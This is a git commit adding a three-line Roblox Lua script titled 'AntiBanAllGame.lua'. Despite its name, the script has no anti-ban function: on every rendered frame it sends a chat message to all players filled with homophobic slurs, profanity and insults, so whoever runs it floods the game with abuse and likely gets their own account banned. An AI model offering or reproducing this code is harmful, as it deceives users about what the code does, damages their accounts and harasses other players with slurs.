70ebde408402485b530d865ffc4254cc10e8c139
Khuat Anh Viet <89727348+banonehen03@users.noreply.github.com>
2022-07-14 19:36:49 +0700

    Create AntiBanAllGame.lua

---
+++ AntiBanAllGame.lua
@@ -0,0 +1,3 @@
+game:GetService("RunService").RenderStepped:Connect(function()
+   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("gay, g ay, ga y, g a y, g ay, g a y, gay, gay, roblox trash fuk roblox, sh it , roblox trash , roblox gay , roblox no have dick , roblox fuck girl","All")
+end)
